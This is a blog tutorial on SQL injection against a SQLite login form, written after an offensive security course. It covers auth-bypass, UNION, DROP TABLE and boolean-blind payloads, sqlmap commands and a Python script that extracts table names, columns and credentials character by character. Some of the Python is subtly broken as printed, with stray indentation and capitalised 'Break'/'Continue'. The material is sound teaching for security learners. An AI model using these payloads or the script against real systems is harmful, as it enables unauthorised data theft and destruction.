---
layout: post
title: "SQL Injection: Recreating SQLMap"
---

When I first began my cybersecurity training, I often fell into the trap of using pre-build tools when attempting to crack into practice boxes. I would often ultimately fall short because I didn't understand how these tools worked behind the scenes. Recently, I had the great fortune of taking a semester-long offensive security course. This class not only made me aware of own my shortcomings when it came to the fundamentals of exploits, but gave me the opportunity to build my own exploits and really understand vulnerabilites at a low level.

While premade schools will always be a fundamental part of any offensive security toolbox, it is extremely important to understand how they work so that you can troubleshoot them when they fail.  More often than not, you will also need to modify tools yourself when you encounter boxes or real world systems that have unusual configurations.

This series of blogs serves to help educate myself and others on the fundamental building blocks of exploits by trying to build popular offensive security tools from scratch. While the tools I build will definitely lack the full functionality and features of popular tools, I hope to emulate at least one core functionality of these tools to better understand how they work and build confidence in my own abilities to author new tools and discover vulnerabilities going forward

# SQL Injection

Literally thousands of articles, guides, and courses have been written on SQL injection. Rather than add to the pile, I want this blog to take a different approach and examine the concept through the lens of recreating [SQLMap](https://sqlmap.org/), possibly the greatest and most robust SQL injection tool ever created. 

If you want a more fundamental lesson on SQL, here are some good resources: 
https://www.w3schools.com/sql/
https://www.sqlite.org/index.html

If you want a more comprehensive course of SQL injection in general, see the links below. 
https://academy.hackthebox.com/course/preview/sql-injection-fundamentals
https://tryhackme.com/room/sqlinjectionlm
https://pwn.college/intro-to-cybersecurity/web-security/

Finally, if you want a comprehensive source of SQL injection techniques, syntax, and variations, there is no better resource than [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) on Github.

## SQL: A Brief Overview

SQL injection is a prolific and well-documented vulnerability which allows users to unintentionally view and manipulate backend SQL databases.  This vulnerability is not as prolific in modern web applications as it once was due to established mitigations. "Injection" as a category (which includes other forms besides SQL) fell from 1st to 3rd on the [OWASP Top Ten](https://owasp.org/www-project-top-ten/) from 2017 to 2021.

SQL injection occurs when developers fail to sanitize user input (the root of many other kinds of vulnerabilities). The [mitigation is straightforward](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), and many libraries exist for a variety of programing languages to create safe queries from user input.

The syntax of an injection depends on the flavor of SQL, whether that be MySQL, SQLite, PostgreSQL, etc. For the examples below, I will use SQLite, which is often used in mobile applications.

Say your web application uses a SQLite database to store usernames and passwords. In an insecure setup, your application may attempt to validate that the particular combination of username and password exists. This could be done with a php script, for example:
```
$query = "SELECT data FROM Users WHERE username='$username' AND password='$password'";
$result = $db->query($query);
```
However, what happens if the user preemptively ends the “username” string by including a single quote as part of his input into the username field? As it turns out, this will terminate the string, and all subsequent input will be treated like a continuation of the SQL query. We could follow our single quote with a semicolon, which in SQL terminates a query. Even better, we can add on a double dash “--” which comments out all subsequent strings and operands. As such, inputting
```
admin’;--
```
to the username field would result in the backend query looking like
```
SELECT data FROM Users WHERE username='admin’;--' AND password='$password'";

```
which, considering the query was terminated with “;” and commented out with “--”, the only SQL that is executed is
```
SELECT data FROM Users WHERE username='admin’;
```
We can verify this works through [db-fiddle](https://www.db-fiddle.com/), a website that allows us to quickly spin up databases and test SQL Queries (make sure your Database is set to SQLite):
https://www.db-fiddle.com/f/7HLhYfv552zx9L4ga1fXCw/0

With this, our SQL only checks if the “admin” string exists in the username columns of the Users table. If it does, it is very possible we will bypass password authentication and gain access to the admin account.

If an input field is vulnerable to SQL injection, it opens up a huge number of possibilities besides bypassing authentication. We essentially have the power to arbitrarily execute our own SQL queries on the backend database. A few popular abuses include:

### Union Queries

If the vulnerable query returns multiple results, such as a search bar returning multiple rows of an SQL table as a result of a string search, you may be able to append other tables to your results. The UNION operator appends data from one table into another table. The only requirement is that the requested data from these tables be the same number of columns. Say we have another table called “Secrets” and we want to take a look inside. We could append the contents of Secrets onto our username table, such as shown in the below query:

```
SELECT username,password from Users WHERE username='admin' UNION SELECT id, data FROM Secrets;
```
https://www.db-fiddle.com/f/h4mozANPEe5v5c9owrgW7s/0

This example is oversimplified. Because our Secrets and Users tables do not have the same number of columns, at alternative version of these query would not work:
```
SELECT * from Users WHERE username='admin' UNION SELECT id, data FROM Secrets;
```
Because Users has three columns, we would need to add another column to our Secrets request to ensure three columns are being matched with three columns. Thus, if we were trying to inject this Union query, a successful attack would look like this:
```
admin' UNION SELECT id, data, data FROM Secrets;--
```
“data” is called twice to give our secrets table that third necessary column.

It is extremely important to note, this attack would not work in our hypothetical vulnerable login form. We would need a situation in which the results of an SQL query are returned to the end user. In a login form, the SQL query likely just exists to validate whether a username:password combo exists, and if it does, returns true. Otherwise it returns false and we likely give the user an “Invalid Credentials” or “No User Found” error message. As such, our unified table would never be returned back to the client.

### Drop, Create, Insert

More dangerously, SQL injection could allow an attack to manipulate the table or database itself with SQL operators like DROP, Create, and Insert. In our above example, if we terminate the intended query with a semicolon, we are free to then start a new SQL statement. Say, for example, we simply wanted to delete all users from the database. This would be simple enough, all we would need to input into the username field is
```
admin’; DROP TABLE Users;--
```
The security implications of this are obvious. In the db-fiddle example below, the second statement “SELECT * FROM Users” returns an error because the table no longer exists.

https://www.db-fiddle.com/f/rmFFScuwfDqVei3hmpheUD/1

Similar statement could be created with Insert or Create, allowing an attack to create new tables, insert new data into tables, and even [write malicious files](https://www.db-fiddle.com/f/rmFFScuwfDqVei3hmpheUD/1) directly to the database.

### Blind SQL

In our union example above, I mentioned that the web app sometimes doesn’t return any actual information from the database itself, just a true or false statement that something does or does not exist. Even if we find ourselves in this situation, we still have the ability to access information the developer did not intend for us to access.

There are several types of Blind SQL injections. In this article, I will focus on boolean-based blind injection, but [time-based attacks](https://www.db-fiddle.com/f/rmFFScuwfDqVei3hmpheUD/1) are also important to understand.


Back to our login form example, a server will give us different responses depending on what we fill out in the username and password field. In some cases, if we try to login as a user that does not exist, the website may respond to our HTTP POST request with a message that includes “This user does not exist.” Meanwhile, if we login as a user that does exist, but we use the wrong password, we may get a “Invalid credentials” message. Even if the server does not provide us with this information, assuming we have credentials to any user account, or even just a username that we can use to bypass authentication such as the example above, we have the opportunity to ask the server “yes” and “no” questions about its database.

Take the following injection for example:
```
admin' AND 1=1;--
```
Which would result in a SQL statement like:
```
SELECT data FROM Users WHERE username='admin' AND 1=1;--
```
We know from our above examples that admin’;-- will result in us accessing the admin account. However, because we included another comparison, connected by an “AND” statement, the second statement “1=1” must also be true if we are expected to login. If we replace 1=1 with 1=2:
```
admin' AND 1=2;--
```
the server would likely return “access denied” or “invalid credentials.”

Relational SQL databases, including SQLite, store metadata about the database. In the case of SQLite, this metadata is stored in a table called sqlite_schema (also known as sqlite_master, sqlite_temp_schema, and sqlite_temp_master). This table can be queried like another other SQL table. 

Say we wanted to know how many tables exist on this particular database. An SQL statement for this query would look like:
```
SELECT COUNT(name) FROM sqlite_schema WHERE type='table';
```

In our blind injection, we can assess the number of tables in a database with a trial and error approach. Say we suspect there is one table in the database. We can ask the database itself to assess whether this is true or not. All we need to do is set the above statement equal to 1:
```
(SELECT COUNT(name) FROM sqlite_schema WHERE type='table')=1
```

Now, let’s combine this statement with an AND operator along with our known username bypass from above:
```
admin' AND (SELECT COUNT(name) FROM sqlite_schema WHERE type='table')=1;--
```
If there is in fact one table in the database, this injection will result in a successful login to the admin account. Otherwise, the login would fail.

This type of true or false query (boolean) can be expanded to exfiltrate a significant amount of information from a database. Our only limitation is the number of queries we are allowed to send. Say we want to know the name of the table which is storing all of these username and passwords for our login form. It might be a fair guess to assume it is called “users”. Let’s verify if that is true:

```
admin' AND unicode(substr((SELECT group_concat(name, ':') FROM sqlite_schema WHERE type='table'),1,1)) = 117;--
```
In this statement, working from inner parentheses out, we concate the names of the tables in the database, separating them by a colon, then use substr to select 1 character, specifically the first character (SQL starts counts at 1 instead of 0), convert that to unicode, then compare is to 117 (the unicode for a lowercase “u”).

If the first character of the first table does start with u, this will result in a successful login. 

We can keep going with this. Say we now wanted to know the names of the columns in this user table:

```
admin' AND unicode(substr((SELECT group_concat(name, ':') FROM pragma_table_info('users')),1,1)) = 117;--
```
We can use the same trick to guess our column names letter by letter.

Finally, once we know out table and column names, we can start dumping the data within the tables themselves:
```
admin' AND unicode(substr((SELECT group_concat(username, ':') FROM users), 1, 1)) = 117;--
```
This concatenates every username in every row of the users table, then checks if the first letter is equal to u.  Through trial and error, we could exfiltrate the entire database using this method.

## SQLMap

If the process above sounds exhausting, that is because it is. As such, tools began popping up which automate this process for you. Perhaps the most widespread today is SQLMap. SQLMap is an open-source SQL injection testing tool that can automate the blink injection process above and so much more. The latest SQLMap version can automatically test a webpage for vulnerable fields, fingerprint the database type, test different kinds of injections (including all discussed above), and enumerate the entire database via blind injection.

SQLMap takes a url or http request as input then will perform basic test by default, like finding the database type, checking which parameters can be changed, and whether those parameters are vulnerable to any injections.

Say we have a post request exported from Burp Suite called login.request that looks like this:
```
POST /login HTTP/1.1
Host: site.com:80
Content-Length: 35
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://site.com:80
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://site.com:80/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
username=admin&password=password
```

We can enumerate the columns of the “users” table for this login form with the SQLMap command below:

```
sqlmap -r ~/Downloads/loginadmin.request -p username \
   	--cookie="CHALBROKER_USER_ID=jm7512" \
   	--dbms=SQLite --technique=B --string="profile" \  
   	--risk 3 --level 5 --batch \
   	-D main -T users --columns
```

We load the POST request into SQLMap with the -r switch, then specify that the username field is injectable with the -p switch, the DMBS is SQLite, we set the technique to "B" for boolean-based blind, set the string switch equal to "profile" since this string is only returned when a login in valid, set risk and level to the highest values since we are not worried about stealth, batch to skip user input, and -D and -T to set the names of the database and table we are after. Finally, we will start with enumerating the columns with the --columns switch.

SQLMap conducts a blind SQL injection then comes back with this information:
```
[INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)
Database: <current>
Table: users
[3 columns]
+----------+---------+
| Column   | Type	|
+----------+---------+
| id   	| INTEGER |
| password | TEXT	|
| username | TEXT	|
+----------+---------+
```
Once that is complete, SQLMap automatically saves this information to /home/<username>/.local/share/sqlmap/output/site.com. When we want to dump the contents of that table, the columns are already saved for us:
```
sqlmap -r ~/Downloads/loginadmin.request -p username \
   	--cookie="CHALBROKER_USER_ID=jm7512" \
   	--dbms=SQLite --technique=B --string="profile" \  
   	--risk 3 --level 5 --batch \
   	-D main -T users --dump
```

## Can We Automate a Blind SQL Injection Ourselves?

SQLMap is an incredible tool. The functionality and features of SQLMap are beyond anything I could create. In the majority of situations, relying on SQLMap to test for injections is perfectly appropriate and more comprehensive than manually assessments. In addition, if you do want to modify anything about SQLMap, the code is open source and you can easily fork it and add your own features.

However, there might be situations where a custom solution is called for:
* Maybe some configuration prevents SQLMap from functioning as intended.
* We are unable to transfer external tools to whatever machine we are staging our pentest from. * SQLMap is just being too noisy and obvious. 

Thankfully, the basic functionalities of a Blind SQL injection can be automated just as easily using Python.

### Blind SQL Python Script

We can replicate the functionality of SQLMap using the Requests Python library. This library allows us to craft HTTP requests and can control each parameter and field as we do so. The can be downloaded with 
```
pip install requests
```
At the top of our code, we will import the requests library:
```
import requests
```

To start, I would love the functionality of importing a request we intercepted using Burp Suite so we can make sure we are not missing out on any headers that may be important to our POST request.

Our headers must be stored in a dictionary before using them with the request library. We start by separating the headers by line, splitting them by the “: “, then saving each in a dictionary called “headers.” Lines that do not contain a colon are skipped. In our case, this will be the method and any data, which we will be filling in ourselves later
```
request_file = "login.request"

headers = {}
with open(request_file, "r") as f:
	#stores request file as dictionary, removes POST line and params
	for line in f.read().split('\n'):
    	keyvalue = line.split(': ', 1)
    	if len(keyvalue) < 2:
        		continue
    	key = keyvalue[0]
    	value = keyvalue[1]
    	headers[key] = value
print("Headers created")
```
Any cookies we need to access the site should also be specified here.
```
cookie = dict(USER_ID="12345")
```

Now, let’s start crafting the post request. I am going to create a function so we can reuse this for our different queries. The function will take a payload, which in this case will be the injection we load into the “username” field. Data sent by a POST request must once against be in dictionary form. We are going to load an arbitrary value for the password, then add the username payload later. Setting “allow_redicects” to false is important in our case, as we will gauge the success of an injection by the status code of the response. By default, Requests follows a 302 redirect, so our status code would be 200 regardless of whether we had a successful injection.
```
url="http://site.web"
params = {"password": "test"}

def send_payload(payload):
	params['username'] = payload
	response = requests.post(url=url, headers=headers, data=params, cookies=cookie, allow_redirects=False)
	if response.status_code == 404 or response.status_code == 400:
    		print(f"Server responded with status code {response.status_code}")
    		exit(1)
	return response
```

Let’s start with finding the number of tables. This is straightforward, as we simply count up from 0 until the injection results in a 302 redirect, otherwise known as a successful login. We will print the number of tables once this is found.
```
print("Finding the number of tables")
i = 0
while True:
	payload = f"admin' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table')={i}--"
	response = send_payload(payload)
	if response.status_code == 302:
    		print(f"There are {i} tables")
    		break
	i+=1
```


In our examples, there is only one table, so we will focus on finding just this name. This is where we start guessing letter by letter to find our name. We will start with unicode 97 since it represents the first undercase English letter in unicode. We will then send a request with this letter in our payload, followed by the next subsequent letter until we get a 302 response code, indicating a successful login and confirming the first letter of our table. We print this letter and store it in the “table_name” variable. From there, we increment the next place in our name from the first to the second letter with n += 1 and repeat the process. If “i” ever reaches 123, this means we have run out of possible unicode English letters and have likely reached the end of the name string. 
```
print("Finding the name of the table")
print("Table name:", end = " ")
table_name = ""
n = 1 # First letter in the name string
while True:
	i = 97 # first undercase English letter in unicode (decimal)
	while True:
    		payload = f"admin' AND unicode(substr((SELECT name FROM sqlite_master WHERE type='table'),{n},1)) = {i}--"
    		response = send_payload(payload)
    		if response.status_code == 302:
        			print(chr(i), end = "")
        			table_name += chr(i)
        			break
    		if i == 123:
        			break
    		i += 1
if i == 123:
    		print("\ndone")
    		break
n += 1
```
With our table name in hand, we can move onto enumerating the columns. This is much the same process, with a slight twist. Because we know there are multiple columns, we will be concatenating them with colons. After checking for all English letters, we need to set i equal to 58, the unicode for colon, to check to see if there is another column to enumerate. If there is, we increase “n” another digit then set “i” back to the first undercase letter in unicode decimal. We are left with a string called “columns_names” that contains the name separated by colons.

```
n = 1
column_names = ""
done = False
print("Column name:", end = " ")
while True:
	i = 97 # first undercase English letter in unicode (decimal)
	while True:
    	payload = f"admin' AND unicode(substr((SELECT group_concat(name, ':') FROM pragma_table_info('{table_name}')),{n},1)) = {i};--"
    	response = send_payload(payload)
    	if response.status_code == 302:
        	print(chr(i), end = "")
        	column_names += chr(i)
        	Break
    	elif i == 123:
        	i = 58
        	Continue
    	elif i == 58:
        	done = True
        	Break
    	i += 1
	if done:
    	print("\ndone")
    	Break
	n += 1
```


Finally, we find the data within this table under the found columns. This is similar to the above. However, we have an added for loop after for the split column_names string. 

```
n = 1
data_content = ""
print("Table Data")
for column in column_names.split(':'):
   print(f"{column}:")
   column_done = False
   while True:
       i = 33 # first English letter in unicode (decimal)
       while True:
           payload = f"admin' AND unicode(substr((SELECT group_concat({column}, ':') FROM {table_name}), {n}, 1)) = {i};--"
           response = send_payload(payload)
           if response.status_code == 302:
               print(chr(i), end = "")
               break
           elif i == 57:
               i = 64
           elif i == 123:
               i = 58
               continue
           elif i == 58:
               column_done = True
               break
           i += 1
       if column_done:
           print("\n")
           break
       n += 1
```

We are left with an output that looks similar to the below:
```
Headers created
Finding the number of tables
There are 1 tables
Finding the name of the table
Table name: users
done
Column name: id:username:password
done
Table Data
id:
1
username:
admin
password:
secure123
```

You can see the full script at:
https://github.com/MaizeCyber/blindSQLiTutorial/blob/main/SQLiBlind.py


